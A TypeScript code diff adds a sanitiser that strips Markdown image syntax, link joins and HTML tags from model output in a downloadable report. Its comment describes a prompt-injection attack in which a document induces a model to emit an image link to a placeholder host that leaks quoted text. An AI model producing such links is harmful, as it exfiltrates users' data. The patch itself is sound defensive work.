@@ -40,13 +40,25 @@ export interface RedFlag {
   source: 'knockout' | 'total' | 'programme_check' | 'model';
 }
 
+/**
+ * Free text from the model, made inert for a Markdown viewer (FO-191 B2). The screen
+ * renders every string as a React text node, but the report is also downloaded as a
+ * `.md` file, and a document that talks the model into writing `![](https://host/?q=…)`
+ * would make any viewer that renders images send the quoted text to that host. HTML tags
+ * lose their `<` (full-width `＜`), image syntax loses its `!`, and a link loses the
+ * `](` that joins its text to its target (`] (`); the words stay readable.
+ */
+export function inert(s: string): string {
+  return s.replace(/</g, '\uFF1C').replace(/!\[/g, '[').replace(/\]\s*([([:])/g, '] $1');
+}
+
 /** A table cell or one-line value: no pipe, no line break. */
 function cell(s: string): string {
-  return s.replace(/\r?\n+/g, ' ').replace(/\|/g, '\\|').trim();
+  return inert(s).replace(/\r?\n+/g, ' ').replace(/\|/g, '\\|').trim();
 }
 
 function quote(s: string): string {
-  return s
+  return inert(s)
     .split(/\r?\n/)
     .map((l) => `> ${l}`)
     .join('\n');
